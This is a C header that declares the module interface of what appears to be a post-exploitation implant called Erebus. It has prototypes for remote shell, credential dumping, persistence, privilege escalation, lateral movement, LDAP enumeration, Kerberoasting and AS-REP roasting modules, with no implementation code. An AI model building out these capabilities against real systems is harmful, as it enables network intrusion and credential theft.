#ifndef EREBUS_MODULES_H
#define EREBUS_MODULES_H

#include <stddef.h>
#include <stdint.h>

typedef int (*erebus_module_fn)(const uint8_t *config, size_t config_len, uint8_t **out, size_t *out_len);

int erebus_module_execute(const char *name, const uint8_t *config, size_t config_len, uint8_t **out, size_t *out_len);

int erebus_mod_shell(const uint8_t *config, size_t config_len, uint8_t **out, size_t *out_len);
int erebus_mod_creds_dump(const uint8_t *config, size_t config_len, uint8_t **out, size_t *out_len);
int erebus_mod_cloud(const uint8_t *config, size_t config_len, uint8_t **out, size_t *out_len);
int erebus_mod_persist(const uint8_t *config, size_t config_len, uint8_t **out, size_t *out_len);
int erebus_mod_privesc(const uint8_t *config, size_t config_len, uint8_t **out, size_t *out_len);
int erebus_mod_lateral_move(const uint8_t *config, size_t config_len, uint8_t **out, size_t *out_len);
int erebus_mod_ldap_enum(const uint8_t *config, size_t config_len, uint8_t **out, size_t *out_len);
int erebus_mod_kerberoast(const uint8_t *config, size_t config_len, uint8_t **out, size_t *out_len);
int erebus_mod_asreproast(const uint8_t *config, size_t config_len, uint8_t **out, size_t *out_len);

#endif